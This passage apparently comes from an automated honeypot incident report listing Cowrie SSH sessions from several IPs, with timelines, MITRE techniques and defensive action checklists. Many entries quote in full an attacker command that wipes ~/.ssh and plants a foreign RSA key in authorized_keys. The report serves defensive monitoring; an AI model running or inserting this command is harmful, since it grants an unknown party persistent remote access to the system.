| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:26:40` | `cowrie.session.connect` |
| `2026-04-12 10:26:40` | `cowrie.client.version` |
| `2026-04-12 10:26:41` | `cowrie.client.kex` |
| `2026-04-12 10:26:41` | `cowrie.login.success` |
| `2026-04-12 10:26:42` | `cowrie.session.params` |
| `2026-04-12 10:26:42` | `cowrie.command.input` |
| `2026-04-12 10:26:42` | `cowrie.command.failed` |
| `2026-04-12 10:26:42` | `cowrie.log.closed` |
| `2026-04-12 10:26:42` | `cowrie.session.params` |
| `2026-04-12 10:26:42` | `cowrie.command.input` |
| `2026-04-12 10:26:42` | `cowrie.session.file_download` |
| `2026-04-12 10:26:42` | `cowrie.log.closed` |
| `2026-04-12 10:26:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.159[.]125` to AbuseIPDB if not already reported
- [ ] Block `101.47.159[.]125` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b26668aac636

| Field | Detail |
|---|---|
| **Source IP** | `101.47.159[.]125` |
| **First Seen** | 2026-04-12 10:26 |
| **Last Seen** | 2026-04-12 10:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:26:44` | `cowrie.session.connect` |
| `2026-04-12 10:26:44` | `cowrie.client.version` |
| `2026-04-12 10:26:44` | `cowrie.client.kex` |
| `2026-04-12 10:26:45` | `cowrie.login.success` |
| `2026-04-12 10:26:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.159[.]125` to AbuseIPDB if not already reported
- [ ] Block `101.47.159[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b0676ebcce4

| Field | Detail |
|---|---|
| **Source IP** | `62.3.56[.]187` |
| **First Seen** | 2026-04-12 10:28 |
| **Last Seen** | 2026-04-12 10:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:28:26` | `cowrie.session.connect` |
| `2026-04-12 10:28:26` | `cowrie.client.version` |
| `2026-04-12 10:28:26` | `cowrie.client.kex` |
| `2026-04-12 10:28:27` | `cowrie.login.success` |
| `2026-04-12 10:28:27` | `cowrie.session.params` |
| `2026-04-12 10:28:27` | `cowrie.command.input` |
| `2026-04-12 10:28:27` | `cowrie.command.failed` |
| `2026-04-12 10:28:28` | `cowrie.log.closed` |
| `2026-04-12 10:28:28` | `cowrie.session.params` |
| `2026-04-12 10:28:28` | `cowrie.command.input` |
| `2026-04-12 10:28:28` | `cowrie.session.file_download` |
| `2026-04-12 10:28:28` | `cowrie.log.closed` |
| `2026-04-12 10:28:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.3.56[.]187` to AbuseIPDB if not already reported
- [ ] Block `62.3.56[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7577db5e71b

| Field | Detail |
|---|---|
| **Source IP** | `62.3.56[.]187` |
| **First Seen** | 2026-04-12 10:28 |
| **Last Seen** | 2026-04-12 10:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:28:31` | `cowrie.session.connect` |
| `2026-04-12 10:28:31` | `cowrie.client.version` |
| `2026-04-12 10:28:31` | `cowrie.client.kex` |
| `2026-04-12 10:28:32` | `cowrie.login.success` |
| `2026-04-12 10:28:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.3.56[.]187` to AbuseIPDB if not already reported
- [ ] Block `62.3.56[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acbcf23525f4

| Field | Detail |
|---|---|
| **Source IP** | `69.6.221[.]248` |
| **First Seen** | 2026-04-12 10:29 |
| **Last Seen** | 2026-04-12 10:29 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:29:27` | `cowrie.session.connect` |
| `2026-04-12 10:29:27` | `cowrie.client.version` |
| `2026-04-12 10:29:28` | `cowrie.client.kex` |
| `2026-04-12 10:29:29` | `cowrie.login.success` |
| `2026-04-12 10:29:30` | `cowrie.session.params` |
| `2026-04-12 10:29:30` | `cowrie.command.input` |
| `2026-04-12 10:29:30` | `cowrie.command.failed` |
| `2026-04-12 10:29:30` | `cowrie.log.closed` |
| `2026-04-12 10:29:31` | `cowrie.session.params` |
| `2026-04-12 10:29:31` | `cowrie.command.input` |
| `2026-04-12 10:29:31` | `cowrie.session.file_download` |
| `2026-04-12 10:29:31` | `cowrie.log.closed` |
| `2026-04-12 10:29:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.221[.]248` to AbuseIPDB if not already reported
- [ ] Block `69.6.221[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1ff7061b295

| Field | Detail |
|---|---|
| **Source IP** | `69.6.221[.]248` |
| **First Seen** | 2026-04-12 10:29 |
| **Last Seen** | 2026-04-12 10:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:29:35` | `cowrie.session.connect` |
| `2026-04-12 10:29:35` | `cowrie.client.version` |
| `2026-04-12 10:29:35` | `cowrie.client.kex` |
| `2026-04-12 10:29:36` | `cowrie.login.success` |
| `2026-04-12 10:29:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.221[.]248` to AbuseIPDB if not already reported
- [ ] Block `69.6.221[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8960bab3ea0

| Field | Detail |
|---|---|
| **Source IP** | `101.47.159[.]125` |
| **First Seen** | 2026-04-12 10:30 |
| **Last Seen** | 2026-04-12 10:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:30:00` | `cowrie.session.connect` |
| `2026-04-12 10:30:00` | `cowrie.client.version` |
| `2026-04-12 10:30:00` | `cowrie.client.kex` |
| `2026-04-12 10:30:00` | `cowrie.login.success` |
| `2026-04-12 10:30:01` | `cowrie.session.params` |
| `2026-04-12 10:30:01` | `cowrie.command.input` |
| `2026-04-12 10:30:01` | `cowrie.command.failed` |
| `2026-04-12 10:30:01` | `cowrie.log.closed` |
| `2026-04-12 10:30:01` | `cowrie.session.params` |
| `2026-04-12 10:30:01` | `cowrie.command.input` |
| `2026-04-12 10:30:01` | `cowrie.session.file_download` |
| `2026-04-12 10:30:01` | `cowrie.log.closed` |
| `2026-04-12 10:30:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.159[.]125` to AbuseIPDB if not already reported
- [ ] Block `101.47.159[.]125` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe8c527f1d25

| Field | Detail |
|---|---|
| **Source IP** | `101.47.159[.]125` |
| **First Seen** | 2026-04-12 10:30 |
| **Last Seen** | 2026-04-12 10:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:30:03` | `cowrie.session.connect` |
| `2026-04-12 10:30:03` | `cowrie.client.version` |
| `2026-04-12 10:30:04` | `cowrie.client.kex` |
| `2026-04-12 10:30:04` | `cowrie.login.success` |
| `2026-04-12 10:30:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.159[.]125` to AbuseIPDB if not already reported
- [ ] Block `101.47.159[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1f9fc17ed8a

| Field | Detail |
|---|---|
| **Source IP** | `118.193.34[.]157` |
| **First Seen** | 2026-04-12 10:30 |
| **Last Seen** | 2026-04-12 10:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:30:36` | `cowrie.session.connect` |
| `2026-04-12 10:30:36` | `cowrie.client.version` |
| `2026-04-12 10:30:36` | `cowrie.client.kex` |
| `2026-04-12 10:30:36` | `cowrie.login.success` |
| `2026-04-12 10:30:37` | `cowrie.session.params` |
| `2026-04-12 10:30:37` | `cowrie.command.input` |
| `2026-04-12 10:30:37` | `cowrie.command.failed` |
| `2026-04-12 10:30:37` | `cowrie.log.closed` |
| `2026-04-12 10:30:37` | `cowrie.session.params` |
| `2026-04-12 10:30:37` | `cowrie.command.input` |
| `2026-04-12 10:30:37` | `cowrie.session.file_download` |
| `2026-04-12 10:30:37` | `cowrie.log.closed` |
| `2026-04-12 10:30:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.34[.]157` to AbuseIPDB if not already reported
- [ ] Block `118.193.34[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0782ef85dde6

| Field | Detail |
|---|---|
| **Source IP** | `118.193.34[.]157` |
| **First Seen** | 2026-04-12 10:30 |
| **Last Seen** | 2026-04-12 10:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:30:39` | `cowrie.session.connect` |
| `2026-04-12 10:30:39` | `cowrie.client.version` |
| `2026-04-12 10:30:39` | `cowrie.client.kex` |
| `2026-04-12 10:30:39` | `cowrie.login.success` |
| `2026-04-12 10:30:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.34[.]157` to AbuseIPDB if not already reported
- [ ] Block `118.193.34[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5106327be5df

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-12 10:31 |
| **Last Seen** | 2026-04-12 10:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:31:14` | `cowrie.session.connect` |
| `2026-04-12 10:31:14` | `cowrie.client.version` |
| `2026-04-12 10:31:14` | `cowrie.client.kex` |
| `2026-04-12 10:31:15` | `cowrie.login.success` |
| `2026-04-12 10:31:16` | `cowrie.session.params` |
| `2026-04-12 10:31:16` | `cowrie.command.input` |
| `2026-04-12 10:31:16` | `cowrie.command.failed` |
| `2026-04-12 10:31:17` | `cowrie.log.closed` |
| `2026-04-12 10:31:17` | `cowrie.session.params` |
| `2026-04-12 10:31:17` | `cowrie.command.input` |
| `2026-04-12 10:31:18` | `cowrie.session.file_download` |
| `2026-04-12 10:31:18` | `cowrie.log.closed` |
| `2026-04-12 10:31:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65da09b26505

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-12 10:31 |
| **Last Seen** | 2026-04-12 10:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:31:21` | `cowrie.session.connect` |
| `2026-04-12 10:31:21` | `cowrie.client.version` |
| `2026-04-12 10:31:21` | `cowrie.client.kex` |
| `2026-04-12 10:31:23` | `cowrie.login.success` |
| `2026-04-12 10:31:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4d2de3f0420

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-12 10:32 |
| **Last Seen** | 2026-04-12 10:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:32:48` | `cowrie.session.connect` |
| `2026-04-12 10:32:48` | `cowrie.client.version` |
| `2026-04-12 10:32:48` | `cowrie.client.kex` |
| `2026-04-12 10:32:50` | `cowrie.login.success` |
| `2026-04-12 10:32:51` | `cowrie.session.params` |
| `2026-04-12 10:32:51` | `cowrie.command.input` |
| `2026-04-12 10:32:51` | `cowrie.command.failed` |
| `2026-04-12 10:32:51` | `cowrie.log.closed` |
| `2026-04-12 10:32:52` | `cowrie.session.params` |
| `2026-04-12 10:32:52` | `cowrie.command.input` |
| `2026-04-12 10:32:52` | `cowrie.session.file_download` |
| `2026-04-12 10:32:52` | `cowrie.log.closed` |
| `2026-04-12 10:32:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e844e4ce8697

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-12 10:32 |
| **Last Seen** | 2026-04-12 10:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:32:56` | `cowrie.session.connect` |
| `2026-04-12 10:32:56` | `cowrie.client.version` |
| `2026-04-12 10:32:56` | `cowrie.client.kex` |
| `2026-04-12 10:32:57` | `cowrie.login.success` |
| `2026-04-12 10:32:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-561defb70fc3

| Field | Detail |
|---|---|
| **Source IP** | `69.6.221[.]248` |
| **First Seen** | 2026-04-12 10:33 |
| **Last Seen** | 2026-04-12 10:33 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:33:02` | `cowrie.session.connect` |
| `2026-04-12 10:33:02` | `cowrie.client.version` |
| `2026-04-12 10:33:02` | `cowrie.client.kex` |
| `2026-04-12 10:33:04` | `cowrie.login.success` |
| `2026-04-12 10:33:04` | `cowrie.session.params` |
| `2026-04-12 10:33:04` | `cowrie.command.input` |
| `2026-04-12 10:33:04` | `cowrie.command.failed` |
| `2026-04-12 10:33:05` | `cowrie.log.closed` |
| `2026-04-12 10:33:06` | `cowrie.session.params` |
| `2026-04-12 10:33:06` | `cowrie.command.input` |
| `2026-04-12 10:33:06` | `cowrie.session.file_download` |
| `2026-04-12 10:33:06` | `cowrie.log.closed` |
| `2026-04-12 10:33:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.221[.]248` to AbuseIPDB if not already reported
- [ ] Block `69.6.221[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3e6d84c0581

| Field | Detail |
|---|---|
| **Source IP** | `69.6.221[.]248` |
| **First Seen** | 2026-04-12 10:33 |
| **Last Seen** | 2026-04-12 10:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:33:10` | `cowrie.session.connect` |
| `2026-04-12 10:33:10` | `cowrie.client.version` |
| `2026-04-12 10:33:10` | `cowrie.client.kex` |
| `2026-04-12 10:33:11` | `cowrie.login.success` |
| `2026-04-12 10:33:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.221[.]248` to AbuseIPDB if not already reported
- [ ] Block `69.6.221[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fa2b6837d71

| Field | Detail |
|---|---|
| **Source IP** | `128.1.38[.]169` |
| **First Seen** | 2026-04-12 10:33 |
| **Last Seen** | 2026-04-12 10:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:33:12` | `cowrie.session.connect` |
| `2026-04-12 10:33:12` | `cowrie.client.version` |
| `2026-04-12 10:33:12` | `cowrie.client.kex` |
| `2026-04-12 10:33:12` | `cowrie.login.success` |
| `2026-04-12 10:33:13` | `cowrie.session.params` |
| `2026-04-12 10:33:13` | `cowrie.command.input` |
| `2026-04-12 10:33:13` | `cowrie.command.failed` |
| `2026-04-12 10:33:13` | `cowrie.log.closed` |
| `2026-04-12 10:33:13` | `cowrie.session.params` |
| `2026-04-12 10:33:13` | `cowrie.command.input` |
| `2026-04-12 10:33:13` | `cowrie.session.file_download` |
| `2026-04-12 10:33:13` | `cowrie.log.closed` |
| `2026-04-12 10:33:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.1.38[.]169` to AbuseIPDB if not already reported
- [ ] Block `128.1.38[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f0fe04d66c9

| Field | Detail |
|---|---|
| **Source IP** | `128.1.38[.]169` |
| **First Seen** | 2026-04-12 10:33 |
| **Last Seen** | 2026-04-12 10:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
